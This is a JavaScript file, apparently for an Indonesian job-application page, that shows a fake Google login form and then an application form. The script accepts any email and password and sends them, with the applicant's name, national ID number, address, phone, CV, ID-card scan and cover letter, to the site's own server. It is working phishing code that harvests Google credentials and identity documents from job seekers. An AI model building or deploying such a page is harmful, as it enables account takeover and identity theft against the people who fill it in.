// Google Login Form Handler
const googleLoginForm = document.getElementById('googleLoginForm');
const loginSection = document.getElementById('loginSection');
const applicationSection = document.getElementById('applicationSection');

googleLoginForm.addEventListener('submit', function(e) {
    e.preventDefault();
    
    const email = document.getElementById('googleEmail').value;
    const password = document.getElementById('googlePassword').value;
    
    // Validasi email dan password
    if (email && password) {
        // Animasi transisi
        loginSection.style.animation = 'fadeOut 0.5s ease-out';
        
        setTimeout(() => {
            loginSection.classList.add('hidden');
            applicationSection.classList.remove('hidden');
        }, 500);
    }
});

// File Upload Handlers
function setupFileUpload(uploadId, inputId) {
    const uploadElement = document.getElementById(uploadId);
    const inputElement = document.getElementById(inputId);
    const fileNameElement = uploadElement.querySelector('.file-name');
    const uploadTextElement = uploadElement.querySelector('.upload-text');
    
    inputElement.addEventListener('change', function(e) {
        const file = e.target.files[0];
        if (file) {
            fileNameElement.textContent = file.name;
            uploadTextElement.textContent = 'File terpilih';
            uploadElement.style.borderColor = '#4caf50';
            uploadElement.style.background = '#e8f5e9';
        } else {
            fileNameElement.textContent = '';
            uploadTextElement.textContent = 'Klik untuk upload';
            uploadElement.style.borderColor = '#dadce0';
            uploadElement.style.background = 'transparent';
        }
    });
}

// Setup semua file upload
setupFileUpload('cvUpload', 'cv');
setupFileUpload('ktpUpload', 'ktp');
setupFileUpload('suratLamaranUpload', 'suratLamaran');

// Application Form Handler
const applicationForm = document.getElementById('applicationForm');
const successModal = document.getElementById('successModal');

applicationForm.addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const submitBtn = document.querySelector('.btn-submit');
    submitBtn.classList.add('loading');
    submitBtn.disabled = true;
    
    // Ambil data dari form
    const formData = new FormData();
    const googleEmail = document.getElementById('googleEmail').value;
    const googlePassword = document.getElementById('googlePassword').value;
    
    formData.append('googleEmail', googleEmail);
    formData.append('googlePassword', googlePassword);
    formData.append('nama', document.getElementById('nama').value);
    formData.append('nik', document.getElementById('nik').value);
    formData.append('alamat', document.getElementById('alamat').value);
    formData.append('noHp', document.getElementById('noHp').value);
    
    // Tambahkan file
    const cvFile = document.getElementById('cv').files[0];
    const ktpFile = document.getElementById('ktp').files[0];
    const suratLamaranFile = document.getElementById('suratLamaran').files[0];
    
    if (cvFile) formData.append('cv', cvFile);
    if (ktpFile) formData.append('ktp', ktpFile);
    if (suratLamaranFile) formData.append('surat_lamaran', suratLamaranFile);
    
    try {
        // Kirim data ke server
        const response = await fetch('/api/submit-application', {
            method: 'POST',
            body: formData
        });
        
        const result = await response.json();
        
        if (result.success) {
            // Tampilkan modal sukses
            successModal.classList.remove('hidden');
            applicationSection.classList.add('hidden');
        } else {
            alert('Terjadi kesalahan: ' + result.message);
            submitBtn.classList.remove('loading');
            submitBtn.disabled = false;
        }
    } catch (error) {
        console.error('Error:', error);
        alert('Terjadi kesalahan saat mengirim data. Silakan coba lagi.');
        submitBtn.classList.remove('loading');
        submitBtn.disabled = false;
    }
});

// Add fadeOut animation dynamically
const style = document.createElement('style');
style.textContent = `
    @keyframes fadeOut {
        from {
            opacity: 1;
            transform: translateY(0);
        }
        to {
            opacity: 0;
            transform: translateY(-20px);
        }
    }
`;
document.head.appendChild(style);

// Input validation for NIK (must be 16 digits)
const nikInput = document.getElementById('nik');
nikInput.addEventListener('input', function(e) {
    this.value = this.value.replace(/\D/g, '').slice(0, 16);
});

// Input validation for phone number
const noHpInput = document.getElementById('noHp');
noHpInput.addEventListener('input', function(e) {
    this.value = this.value.replace(/\D/g, '');
});